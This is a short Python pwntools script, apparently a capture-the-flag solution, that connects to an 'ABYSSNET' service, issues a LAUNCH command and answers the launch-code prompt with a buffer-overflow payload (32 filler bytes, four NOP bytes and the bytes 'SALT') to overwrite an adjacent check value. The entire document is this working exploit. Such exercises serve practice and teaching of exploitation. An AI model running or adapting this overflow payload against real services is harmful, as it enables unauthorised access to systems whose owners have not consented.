from pwn import *

# Change these as needed
HOST = "abyssnet.dbs"
PORT = 9999

def main():
    # Connect to the ABYSSNET service
    r = remote(HOST, PORT)

    # Wait for the first prompt
    r.recvuntil(b"> ")

    # Send the LAUNCH command
    r.sendline(b"LAUNCH")

    # Wait for the LAUNCH CODE prompt
    r.recvuntil(b"Enter LAUNCH CODE")

    # Build the payload: 32 bytes buffer + 4 NOPs + SALT (little endian)
    buf = b"A" * 32
    nops = b"\x90" * 4
    salt = b"SALT"  # b'\x53\x41\x4c\x54'

    payload = buf + nops + salt

    # Send the crafted launch code
    r.sendline(payload)

    # Print the full response
    result = r.recvall(timeout=5)
    print(result.decode(errors="ignore"))

if __name__ == "__main__":
    main()